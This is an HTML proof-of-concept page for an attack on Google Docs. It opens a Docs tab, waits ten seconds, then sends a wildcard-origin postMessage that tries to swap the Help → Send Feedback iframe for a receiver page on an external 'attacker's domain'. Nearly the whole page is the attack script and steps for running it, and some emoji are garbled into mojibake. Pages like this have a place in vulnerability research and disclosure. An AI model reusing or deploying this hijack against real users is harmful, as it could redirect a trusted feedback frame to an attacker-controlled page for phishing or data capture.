<!DOCTYPE html>
<html>
  <head>
    <title>Google Docs Feedback Hijack PoC</title>
  </head>
  <body>
    <h2>üß™ Google Docs Feedback Hijack Proof-of-Concept</h2>
    <p>
      This page simulates an attacker opening Google Docs in a new window and later hijacking the feedback iframe.
    </p>
    <p><strong>Instructions:</strong></p>
    <ol>
      <li>Click the button below to open a new Google Docs document in a separate tab.</li>
      <li>In that tab, click <em>Help ‚Üí Send Feedback</em>.</li>
      <li>This tab will wait 10 seconds, then attempt to redirect the feedback iframe to the attacker's domain.</li>
    </ol>

    <button onclick="openDocs()">Open Google Docs</button>

    <script>
      const targetURL = "https://musgaas.github.io/receiver-test/receiver.html";

      function openDocs() {
        const win = window.open("https://docs.google.com/document/u/0/create", "docswin");

        // After delay, attempt to redirect the feedback iframe in that tab
        setTimeout(() => {
          try {
            win.postMessage(
              {
                type: "SWAP_FEEDBACK_IFRAME",
                url: targetURL
              },
              "*"
            );
            console.log("üì§ postMessage sent to target window.");
          } catch (err) {
            console.error("‚ùå Failed to send postMessage:", err);
          }
        }, 10000); // Wait 10s for user to trigger "Send Feedback"
      }
    </script>
  </body>
</html>
